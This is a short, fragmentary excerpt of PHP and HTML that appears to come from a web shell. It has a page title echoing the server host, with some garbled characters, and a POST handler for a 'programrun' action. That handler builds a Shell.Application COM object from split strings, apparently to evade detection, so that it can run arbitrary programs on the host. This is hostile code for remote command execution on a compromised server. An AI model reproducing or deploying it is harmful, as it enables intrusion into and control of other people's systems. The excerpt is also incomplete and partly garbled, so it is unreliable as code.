...
<title>http://<?php echo $_SERVER['HTTP_HOST'];?> _蟰'  </title>
<style type="text/css">
body{
...
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
